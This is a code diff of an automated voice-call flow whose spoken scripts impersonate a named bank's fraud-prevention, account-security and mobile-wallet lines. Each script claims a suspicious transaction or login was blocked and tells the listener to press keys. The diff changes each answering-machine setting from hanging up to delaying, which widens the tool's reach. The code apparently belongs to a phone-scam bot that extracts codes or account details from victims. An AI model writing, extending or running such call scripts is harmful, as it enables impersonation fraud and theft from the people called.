@@ -39,7 +39,7 @@ const callFlow = (
             id: uuidv4(),
             action: 'say',
             options: {
-              ifMachine: 'hangup',
+              ifMachine: 'delay',
               payload: `This is a call from ${institutionName.toUpperCase()} fraud prevention line. We have BLOCKED a recent SUSPICIOUS transaction on your account. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
               language,
               voice: 'female',
@@ -82,7 +82,7 @@ const callFlow = (
             id: uuidv4(),
             action: 'say',
             options: {
-              ifMachine: 'hangup',
+              ifMachine: 'delay',
               payload: `This is a call from ${institutionName.toUpperCase()} account security line. We have BLOCKED a recent SUSPICIOUS login attempt on your account. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
               language,
               voice: 'female',
@@ -125,7 +125,7 @@ const callFlow = (
             id: uuidv4(),
             action: 'say',
             options: {
-              ifMachine: 'hangup',
+              ifMachine: 'delay',
               payload: `This is a call from ${institutionName.toUpperCase()} mobile wallet line. We have BLOCKED a recent SUSPICIOUS ${wallet} purchase. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
               language,
               voice: 'female',
@@ -172,7 +172,7 @@ const callFlow = (
             id: uuidv4(),
             action: 'say',
             options: {
-              ifMachine: 'hangup',
+              ifMachine: 'delay',
               payload: `This is a call from ${institutionName.toUpperCase()} fraud prevention line. We have BLOCKED a recent SUSPICIOUS online purchase, your ${cardType} card details was used. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
               language,
               voice: 'female',
